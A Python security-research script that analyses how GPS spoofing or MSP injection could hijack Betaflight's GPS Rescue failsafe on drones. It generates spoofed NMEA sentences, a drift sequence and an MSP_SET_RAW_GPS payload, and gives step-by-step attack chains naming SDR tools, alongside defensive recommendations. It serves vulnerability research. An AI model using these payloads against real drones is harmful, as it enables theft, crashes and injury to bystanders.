#!/usr/bin/env python3
"""
Betaflight GPS Rescue Mode Hijack Analysis

Analyzes the GPS Rescue failsafe mechanism in Betaflight 4.4.2 to
identify how GPS spoofing could redirect the drone's autonomous
return-to-home behavior.

GPS Rescue (Betaflight 4.x+) activates when:
  - Failsafe triggers (ELRS link loss for >1s by default)
  - Pilot manually activates via AUX channel
  - Throttle-based failsafe timeout expires

When active, GPS Rescue:
  1. Climbs to configured altitude (default 30-50m)
  2. Calculates heading to saved "home" GPS coordinates
  3. Flies toward home at configured speed
  4. Descends and lands when close to home position

Attack surfaces:
  1. HOME POSITION POISONING: Spoof GPS during arming to set a false
     home location. When GPS Rescue activates, drone flies to attacker's
     coordinates.
  2. IN-FLIGHT REDIRECT: Spoof GPS during GPS Rescue to make the drone
     believe it's flying the wrong direction, causing it to correct
     toward the attacker's chosen location.
  3. ALTITUDE MANIPULATION: Spoof altitude to make the drone climb
     excessively (battery drain, loss of visual) or descend into obstacles.
  4. POSITION HOLD DRIFT: Gradually shift spoofed coordinates during
     position hold to slowly move the drone.
  5. GEOFENCE BYPASS/TRIGGER: Spoof coordinates inside/outside geofence
     boundaries.

Betaflight GPS Rescue implementation:
  - Source: src/main/flight/gps_rescue.c (Betaflight 4.4.2)
  - Home position saved at arming (from GPS fix at that moment)
  - No GPS authentication (accepts any NMEA/UBX input)
  - No spoofing detection (no consistency checks between GPS and IMU)
  - No multi-constellation cross-validation

Relevance to TinyHawk III Plus:
  - The TinyHawk III Plus does NOT have a GPS module
  - GPS Rescue is a popular upgrade (BN-220, M8N, M10 modules)
  - If GPS is added, this attack becomes directly applicable
  - The MSP-over-ELRS path can also inject GPS data via MSP_SET_RAW_GPS

Usage:
  python3 gps-rescue-hijack.py --analyze
  python3 gps-rescue-hijack.py --rescue-params
  python3 gps-rescue-hijack.py --spoof-scenarios
  python3 gps-rescue-hijack.py --generate-nmea
  python3 gps-rescue-hijack.py --chain

For authorized security research and CTF use only.
"""

import argparse
import json
import math
import os
import struct
import sys
import time

_TOOLS_DIR = os.path.dirname(os.path.abspath(__file__))
if _TOOLS_DIR not in sys.path:
    sys.path.insert(0, _TOOLS_DIR)


# ---------------------------------------------------------------------------
# Betaflight GPS Rescue parameters (4.4.2 defaults)
# ---------------------------------------------------------------------------

GPS_RESCUE_PARAMS = {
    "gps_rescue_min_sats": {
        "default": 8, "range": "5-50",
        "description": "Minimum satellites for GPS Rescue activation",
    },
    "gps_rescue_angle": {
        "default": 32, "range": "0-200", "unit": "degrees",
        "description": "Maximum pitch angle during rescue (speed control)",
    },
    "gps_rescue_initial_alt": {
        "default": 50, "range": "20-100", "unit": "meters",
        "description": "Target altitude for initial climb phase",
    },
    "gps_rescue_descent_dist": {
        "default": 200, "range": "30-500", "unit": "meters",
        "description": "Distance from home to begin descent",
    },
    "gps_rescue_ground_speed": {
        "default": 2000, "range": "0-2000", "unit": "cm/s",
        "description": "Target ground speed during rescue (20 m/s max)",
    },
    "gps_rescue_throttle_min": {
        "default": 1100, "range": "1000-2000", "unit": "us",
        "description": "Minimum throttle during rescue",
    },
    "gps_rescue_throttle_max": {
        "default": 1600, "range": "1000-2000", "unit": "us",
        "description": "Maximum throttle during rescue",
    },
    "gps_rescue_throttle_hover": {
        "default": 1280, "range": "1000-2000", "unit": "us",
        "description": "Hover throttle estimate",
    },
    "gps_rescue_sanity_checks": {
        "default": "RESCUE_SANITY_ON", "options": ["OFF", "ON", "FS_ONLY"],
        "description": "Enable rescue sanity checks (stuck detection)",
    },
    "gps_rescue_velocity_p": {
        "default": 80, "range": "0-500",
        "description": "Velocity P gain for rescue navigation",
    },
    "gps_rescue_velocity_i": {
        "default": 40, "range": "0-500",
        "description": "Velocity I gain for rescue navigation",
    },
    "gps_rescue_velocity_d": {
        "default": 12, "range": "0-500",
        "description": "Velocity D gain for rescue navigation",
    },
    "gps_rescue_yaw_p": {
        "default": 40, "range": "0-500",
        "description": "Yaw P gain for heading correction",
    },
}

# GPS Rescue state machine (from gps_rescue.c)
RESCUE_STATES = {
    "RESCUE_IDLE": "Not active",
    "RESCUE_ATTAIN_ALT": "Climbing to rescue altitude",
    "RESCUE_ROTATE": "Rotating to face home",
    "RESCUE_FLY_HOME": "Flying toward home coordinates",
    "RESCUE_DESCENT": "Descending near home",
    "RESCUE_LANDING": "Final landing phase",
    "RESCUE_COMPLETE": "Landed, motors off",
    "RESCUE_ABORT": "Aborted (sanity check failure)",
    "RESCUE_DO_NOTHING": "RC recovered during rescue",
}


# ---------------------------------------------------------------------------
# NMEA sentence generation
# ---------------------------------------------------------------------------

def nmea_checksum(sentence):
    """Compute NMEA checksum (XOR of all chars between $ and *)."""
    cs = 0
    for c in sentence:
        cs ^= ord(c)
    return f"{cs:02X}"


def build_gga(lat, lon, alt=100.0, num_sats=12, fix_quality=1,
              hdop=1.0, timestamp=None):
    """Build NMEA GGA sentence (GPS fix data)."""
    if timestamp is None:
        t = time.gmtime()
        timestamp = f"{t.tm_hour:02d}{t.tm_min:02d}{t.tm_sec:02d}.00"

    lat_deg = int(abs(lat))
    lat_min = (abs(lat) - lat_deg) * 60
    lat_str = f"{lat_deg:02d}{lat_min:09.6f}"
    lat_dir = "N" if lat >= 0 else "S"

    lon_deg = int(abs(lon))
    lon_min = (abs(lon) - lon_deg) * 60
    lon_str = f"{lon_deg:03d}{lon_min:09.6f}"
    lon_dir = "E" if lon >= 0 else "W"

    # Geoid separation (approximate)
    geoid = 47.0

    body = (f"GPGGA,{timestamp},{lat_str},{lat_dir},{lon_str},{lon_dir},"
            f"{fix_quality},{num_sats:02d},{hdop:.1f},{alt:.1f},M,"
            f"{geoid:.1f},M,,")
    return f"${body}*{nmea_checksum(body)}"


def build_rmc(lat, lon, speed_knots=0.0, heading=0.0, timestamp=None):
    """Build NMEA RMC sentence (recommended minimum)."""
    if timestamp is None:
        t = time.gmtime()
        timestamp = f"{t.tm_hour:02d}{t.tm_min:02d}{t.tm_sec:02d}.00"
        datestamp = f"{t.tm_mday:02d}{t.tm_mon:02d}{t.tm_year % 100:02d}"
    else:
        datestamp = "011126"  # dummy date

    lat_deg = int(abs(lat))
    lat_min = (abs(lat) - lat_deg) * 60
    lat_str = f"{lat_deg:02d}{lat_min:09.6f}"
    lat_dir = "N" if lat >= 0 else "S"

    lon_deg = int(abs(lon))
    lon_min = (abs(lon) - lon_deg) * 60
    lon_str = f"{lon_deg:03d}{lon_min:09.6f}"
    lon_dir = "E" if lon >= 0 else "W"

    body = (f"GPRMC,{timestamp},A,{lat_str},{lat_dir},{lon_str},{lon_dir},"
            f"{speed_knots:.1f},{heading:.1f},{datestamp},,A")
    return f"${body}*{nmea_checksum(body)}"


def build_gsa(fix_type=3, pdop=1.5, hdop=1.0, vdop=1.2,
              sat_ids=None):
    """Build NMEA GSA sentence (DOP and active satellites)."""
    if sat_ids is None:
        sat_ids = list(range(1, 13))
    sats = ",".join(f"{s:02d}" for s in sat_ids[:12])
    while sats.count(",") < 11:
        sats += ","
    body = f"GPGSA,A,{fix_type},{sats},{pdop:.1f},{hdop:.1f},{vdop:.1f}"
    return f"${body}*{nmea_checksum(body)}"


# ---------------------------------------------------------------------------
# Haversine distance
# ---------------------------------------------------------------------------

def haversine_m(lat1, lon1, lat2, lon2):
    """Distance in meters between two GPS coordinates."""
    R = 6371000
    phi1, phi2 = math.radians(lat1), math.radians(lat2)
    dphi = math.radians(lat2 - lat1)
    dlam = math.radians(lon2 - lon1)
    a = (math.sin(dphi / 2) ** 2 +
         math.cos(phi1) * math.cos(phi2) * math.sin(dlam / 2) ** 2)
    return R * 2 * math.atan2(math.sqrt(a), math.sqrt(1 - a))


def bearing_deg(lat1, lon1, lat2, lon2):
    """Initial bearing from point 1 to point 2 in degrees."""
    phi1, phi2 = math.radians(lat1), math.radians(lat2)
    dlam = math.radians(lon2 - lon1)
    y = math.sin(dlam) * math.cos(phi2)
    x = (math.cos(phi1) * math.sin(phi2) -
         math.sin(phi1) * math.cos(phi2) * math.cos(dlam))
    return (math.degrees(math.atan2(y, x)) + 360) % 360


# ---------------------------------------------------------------------------
# Analysis functions
# ---------------------------------------------------------------------------

def analyze_rescue_mechanism():
    """Analyze the GPS Rescue failsafe mechanism."""
    print("\n" + "=" * 70)
    print("Betaflight GPS Rescue Mechanism Analysis")
    print("=" * 70)

    print("\n  STATE MACHINE:")
    for state, desc in RESCUE_STATES.items():
        print(f"    {state}: {desc}")

    print("\n  RESCUE SEQUENCE:")
    print("    1. Link loss detected (ELRS telemetry timeout)")
    print("    2. Failsafe activates after configured delay (default: 1s)")
    print("    3. GPS Rescue engages if GPS fix is valid (>= min_sats)")
    print("    4. ATTAIN_ALT: Climb to gps_rescue_initial_alt")
    print("    5. ROTATE: Yaw to face home coordinates")
    print("    6. FLY_HOME: Fly toward home at gps_rescue_ground_speed")
    print("    7. DESCENT: Begin descending at gps_rescue_descent_dist from home")
    print("    8. LANDING: Final descent to ground level")
    print("    9. COMPLETE: Disarm motors")

    print("\n  SECURITY ANALYSIS:")
    print("    NO GPS AUTHENTICATION:")
    print("      - Betaflight accepts raw NMEA/UBX from GPS UART")
    print("      - No digital signature on GPS messages")
    print("      - No consistency check between GPS and IMU")
    print("      - No multi-GNSS cross-validation")
    print("      - No anti-spoofing (Galileo OSNMA not supported)")
    print("    HOME POSITION TRUST:")
    print("      - Saved once at arming time from current GPS fix")
    print("      - If GPS is spoofed at arm time → false home stored")
    print("      - No re-validation of home position during flight")
    print("      - No pilot confirmation of home coordinates")
    print("    SANITY CHECKS (limited):")
    print("      - gps_rescue_sanity_checks: stuck detection only")
    print("      - Checks if drone is making progress toward home")
    print("      - Does NOT detect if 'home' itself is spoofed")
    print("      - Does NOT detect gradual position drift")


def analyze_rescue_params():
    """Display GPS Rescue parameters and their attack relevance."""
    print("\n" + "=" * 70)
    print("GPS Rescue Parameters — Attack Relevance")
    print("=" * 70)

    for name, p in GPS_RESCUE_PARAMS.items():
        print(f"\n  {name}:")
        print(f"    Default: {p['default']}")
        print(f"    Range: {p['range']}")
        if "unit" in p:
            print(f"    Unit: {p['unit']}")
        print(f"    Description: {p['description']}")

    print("\n  ATTACK-RELEVANT PARAMETERS:")
    print("    gps_rescue_min_sats (8): Spoof must provide >= 8 fake sats")
    print("    gps_rescue_initial_alt (50m): Climb height — spoofing alt could")
    print("      cause excessive climb or crash into terrain")
    print("    gps_rescue_descent_dist (200m): If spoofed home is offset by")
    print("      < 200m, drone begins descending immediately")
    print("    gps_rescue_sanity_checks: If ON, drone aborts rescue if it")
    print("      detects no progress — attacker must ensure apparent progress")
    print("    gps_rescue_ground_speed (20 m/s): Drone may fly fast toward")
    print("      spoofed home — potential collision at speed")

    print("\n  MSP GPS INJECTION PATH:")
    print("    MSP_SET_RAW_GPS (201): Write GPS coordinates directly via MSP")
    print("    Fields: fixType, numSat, lat (1e-7 deg), lon (1e-7 deg),")
    print("            alt (cm), groundSpeed (cm/s), groundCourse (0.1 deg)")
    print("    Reachable via ELRS OTA → CRSF → MSP path")
    print("    No authentication on MSP_SET_RAW_GPS command")
    print("    This BYPASSES the GPS module entirely — direct coordinate injection")


def analyze_spoof_scenarios():
    """Analyze specific GPS spoofing attack scenarios."""
    print("\n" + "=" * 70)
    print("GPS Spoofing Attack Scenarios")
    print("=" * 70)

    # Scenario coordinates (synthetic, for analysis only)
    real_home = (47.3977, 8.5456)  # synthetic home position
    real_pos = (47.4020, 8.5500)   # synthetic current position

    scenarios = [
        {
            "name": "Home Position Poisoning",
            "severity": "CRITICAL",
            "description": (
                "Spoof GPS coordinates during arming phase to set a false "
                "home location. When GPS Rescue activates, the drone flies "
                "to the attacker's chosen coordinates."
            ),
            "spoofed_home": (47.4100, 8.5600),
            "mechanism": [
                "1. Begin GPS spoofing before pilot arms the drone",
                "2. Betaflight saves spoofed coordinates as home",
                "3. Wait for link loss or failsafe activation",
                "4. Drone climbs, rotates toward FALSE home, flies to attacker",
                "5. Drone lands at attacker-controlled location",
            ],
            "requirements": "SDR transmitting GPS L1 C/A (1575.42 MHz)",
            "power": "10-20 dB above real GPS signals at target",
        },
        {
            "name": "In-Flight GPS Redirect",
            "severity": "HIGH",
            "description": (
                "During active GPS Rescue, spoof GPS to make the drone "
                "believe it's at a different position, causing navigation "
                "corrections toward the attacker's chosen location."
            ),
            "spoofed_home": None,
            "mechanism": [
                "1. GPS Rescue is active (link loss occurred)",
                "2. Gradually shift spoofed GPS position",
                "3. Drone 'corrects' toward actual home but is misnavigating",
                "4. Net effect: drone drifts toward attacker's location",
                "5. Must maintain plausible speed/position consistency",
            ],
            "requirements": "SDR with smooth coordinate transition capability",
            "power": "Must overpower real GPS at drone's antenna",
        },
        {
            "name": "Altitude Manipulation",
            "severity": "HIGH",
            "description": (
                "Spoof GPS altitude to force excessive climb (battery drain) "
                "or premature descent (crash into terrain/obstacles)."
            ),
            "spoofed_home": None,
            "mechanism": [
                "1. Spoof GPS altitude as much lower than actual",
                "2. Betaflight thinks it's below gps_rescue_initial_alt",
                "3. Drone climbs aggressively to reach 'target' altitude",
                "4. OR: spoof altitude as higher than actual",
                "5. Drone descends into obstacles thinking it's too high",
            ],
            "requirements": "SDR GPS spoofing with altitude control",
            "power": "Standard GPS spoof power levels",
        },
        {
            "name": "MSP GPS Injection (No SDR Required)",
            "severity": "CRITICAL",
            "description": (
                "Inject false GPS coordinates directly via MSP_SET_RAW_GPS "
                "over the ELRS OTA → CRSF → MSP path. No GPS spoofing "
                "hardware required — pure protocol attack."
            ),
            "spoofed_home": None,
            "mechanism": [
                "1. Achieve ELRS session hijack (see elrs-session-hijack.py)",
                "2. Send MSP_SET_RAW_GPS with false coordinates",
                "3. Betaflight updates internal GPS state",
                "4. If sent before arming: false home position stored",
                "5. If sent during rescue: navigation redirected",
                "6. Advantage: no RF equipment beyond ELRS hijack tools",
            ],
            "requirements": "ELRS session hijack capability",
            "power": "N/A (protocol-level attack)",
        },
    ]

    for i, s in enumerate(scenarios, 1):
        print(f"\n  SCENARIO {i}: {s['name']}")
        print(f"    Severity: {s['severity']}")
        print(f"    {s['description']}")
        print(f"    Requirements: {s['requirements']}")
        if s.get("power"):
            print(f"    Power: {s['power']}")
        print(f"    Mechanism:")
        for step in s["mechanism"]:
            print(f"      {step}")

        if s.get("spoofed_home"):
            sh = s["spoofed_home"]
            offset = haversine_m(real_home[0], real_home[1], sh[0], sh[1])
            brg = bearing_deg(real_home[0], real_home[1], sh[0], sh[1])
            print(f"    Example offset: {offset:.0f}m at bearing {brg:.0f}° from real home")

    # NMEA demonstration
    print(f"\n  SAMPLE SPOOFED NMEA (for analysis):")
    fake_lat, fake_lon = 47.4100, 8.5600
    gga = build_gga(fake_lat, fake_lon, alt=50.0, num_sats=12)
    rmc = build_rmc(fake_lat, fake_lon, speed_knots=0.0, heading=0.0)
    gsa = build_gsa(fix_type=3)
    print(f"    GGA: {gga}")
    print(f"    RMC: {rmc}")
    print(f"    GSA: {gsa}")
    offset = haversine_m(real_home[0], real_home[1], fake_lat, fake_lon)
    print(f"    Offset from real home: {offset:.0f}m")


def generate_nmea_sequence():
    """Generate a sequence of NMEA sentences for analysis."""
    print("\n" + "=" * 70)
    print("NMEA Spoofing Sequence (Offline Analysis)")
    print("=" * 70)

    # Simulate gradual position drift (home poisoning scenario)
    real_lat, real_lon = 47.3977, 8.5456
    target_lat, target_lon = 47.4050, 8.5530
    steps = 10
    print(f"\n  Gradual drift sequence: {steps} steps")
    print(f"  Real position: ({real_lat:.4f}, {real_lon:.4f})")
    print(f"  Target (spoofed): ({target_lat:.4f}, {target_lon:.4f})")
    total_drift = haversine_m(real_lat, real_lon, target_lat, target_lon)
    print(f"  Total drift: {total_drift:.0f}m")

    for step in range(steps + 1):
        frac = step / steps
        lat = real_lat + (target_lat - real_lat) * frac
        lon = real_lon + (target_lon - real_lon) * frac
        gga = build_gga(lat, lon, alt=50.0, num_sats=12)
        drift = haversine_m(real_lat, real_lon, lat, lon)
        print(f"\n  Step {step}/{steps} (drift: {drift:.0f}m):")
        print(f"    {gga}")

    # MSP_SET_RAW_GPS payload
    print(f"\n  MSP_SET_RAW_GPS PAYLOAD (alternative injection path):")
    print(f"    MSP command ID: 201 (MSP_SET_RAW_GPS)")
    fake_lat_e7 = int(target_lat * 1e7)
    fake_lon_e7 = int(target_lon * 1e7)
    fake_alt_cm = 5000  # 50m
    payload = struct.pack("<BBiiHHH",
                          3,       # fixType (3D fix)
                          12,      # numSat
                          fake_lat_e7,
                          fake_lon_e7,
                          fake_alt_cm,
                          0,       # groundSpeed cm/s
                          0)       # groundCourse 0.1 deg
    print(f"    Payload ({len(payload)} bytes): {payload.hex()}")
    print(f"    fixType: 3 (3D fix)")
    print(f"    numSat: 12")
    print(f"    lat: {fake_lat_e7} ({target_lat:.7f}°)")
    print(f"    lon: {fake_lon_e7} ({target_lon:.7f}°)")
    print(f"    alt: {fake_alt_cm} cm ({fake_alt_cm / 100}m)")


def analyze_chains():
    """Analyze GPS-related attack chains."""
    print("\n" + "=" * 70)
    print("GPS Attack Chain Analysis")
    print("=" * 70)

    chains = [
        {
            "id": "GPS-KC-01",
            "name": "GPS Rescue Redirect via RF Spoofing",
            "severity": "CRITICAL",
            "stages": [
                "RECON: Identify target drone's home position (telemetry intercept)",
                "WEAPONIZE: Configure SDR GPS spoofer with target coordinates",
                "DELIVER: Broadcast spoofed GPS L1 C/A signals (1575.42 MHz)",
                "EXPLOIT: Drone's GPS receiver locks onto spoofed signals",
                "ACTIONS: GPS Rescue flies drone to attacker's coordinates",
            ],
            "hardware": "HackRF One (~$300) or similar SDR + GPS-SDR-SIM",
            "range": "10m to several km depending on power and antenna",
            "detection": "IMU/GPS consistency checks (not in Betaflight 4.4.2)",
        },
        {
            "id": "GPS-KC-02",
            "name": "GPS Rescue Redirect via MSP Injection",
            "severity": "CRITICAL",
            "stages": [
                "RECON: Capture ELRS SYNC, derive UID (binding phrase crack)",
                "WEAPONIZE: Build MSP_SET_RAW_GPS payload with target coords",
                "DELIVER: Hijack ELRS session, send MSP over CRSF",
                "EXPLOIT: Betaflight accepts injected GPS coordinates",
                "ACTIONS: GPS Rescue navigates to false coordinates",
            ],
            "hardware": "SDR for ELRS injection (~$100-300)",
            "range": "ELRS range (hundreds of meters to km)",
            "detection": "MSP command logging (not standard), telemetry anomaly",
        },
        {
            "id": "GPS-KC-03",
            "name": "Geofence Evasion via GPS Spoof",
            "severity": "MEDIUM",
            "stages": [
                "RECON: Identify geofence boundaries from drone config or public data",
                "WEAPONIZE: Generate GPS coordinates inside allowed area",
                "DELIVER: Spoof GPS to make drone appear in allowed zone",
                "EXPLOIT: Geofence check passes with spoofed coordinates",
                "ACTIONS: Drone operates in restricted area without geofence trigger",
            ],
            "hardware": "SDR GPS spoofer",
            "range": "Must be within GPS spoofing range of target",
            "detection": "Visual observation, ADS-B/radar correlation",
        },
    ]

    for c in chains:
        print(f"\n  CHAIN {c['id']}: {c['name']}")
        print(f"    Severity: {c['severity']}")
        for stage in c["stages"]:
            print(f"      {stage}")
        print(f"    Hardware: {c['hardware']}")
        print(f"    Range: {c['range']}")
        print(f"    Detection: {c['detection']}")

    print("\n  CURRENT HARDWARE STATUS:")
    print("    TinyHawk III Plus: NO GPS module — not directly vulnerable")
    print("    If GPS added (popular upgrade): fully vulnerable to all chains")
    print("    GPS-KC-02 (MSP injection) works even without hardware GPS module")
    print("      — MSP_SET_RAW_GPS writes to internal state regardless")

    print("\n  DEFENSIVE RECOMMENDATIONS:")
    print("    1. IMU/GPS consistency checks (accelerometer vs GPS velocity)")
    print("    2. Barometer/GPS altitude cross-validation")
    print("    3. GNSS authentication (Galileo OSNMA — not yet in Betaflight)")
    print("    4. Multi-constellation validation (GPS + Galileo + GLONASS)")
    print("    5. Rate-of-change limits on GPS position updates")
    print("    6. MSP_SET_RAW_GPS should require arming/auth (Betaflight #15752)")


def main():
    parser = argparse.ArgumentParser(
        description="Betaflight GPS Rescue Hijack Analysis"
    )
    parser.add_argument(
        "--analyze", action="store_true",
        help="Analyze GPS Rescue mechanism security",
    )
    parser.add_argument(
        "--rescue-params", action="store_true",
        help="Display GPS Rescue parameters and attack relevance",
    )
    parser.add_argument(
        "--spoof-scenarios", action="store_true",
        help="Analyze GPS spoofing attack scenarios",
    )
    parser.add_argument(
        "--generate-nmea", action="store_true",
        help="Generate sample NMEA spoofing sequences",
    )
    parser.add_argument(
        "--chain", action="store_true",
        help="Analyze GPS attack chains",
    )
    parser.add_argument(
        "-o", "--output",
        help="Output JSON file",
    )
    args = parser.parse_args()

    print("Betaflight GPS Rescue Hijack Analysis")
    print(f"Target firmware: Betaflight 4.4.2")
    print(f"GPS Rescue source: src/main/flight/gps_rescue.c")
    print(f"MSP injection: MSP_SET_RAW_GPS (ID 201)")
    print(f"TinyHawk III Plus: No GPS (upgrade path vulnerable)")
    print(f"Authentication: NONE (GPS + MSP both unauthenticated)")

    results = {
        "target_firmware": "Betaflight 4.4.2",
        "gps_authentication": False,
        "msp_gps_injection": True,
        "spoofing_scenarios": 4,
        "chains": 3,
        "tinyhawk_gps": False,
        "upgrade_vulnerable": True,
    }

    if args.analyze:
        analyze_rescue_mechanism()

    if args.rescue_params:
        analyze_rescue_params()

    if args.spoof_scenarios:
        analyze_spoof_scenarios()

    if args.generate_nmea:
        generate_nmea_sequence()

    if args.chain:
        analyze_chains()

    if not any([args.analyze, args.rescue_params, args.spoof_scenarios,
                args.generate_nmea, args.chain]):
        analyze_rescue_mechanism()
        analyze_spoof_scenarios()
        analyze_chains()

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\nResults written to {args.output}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
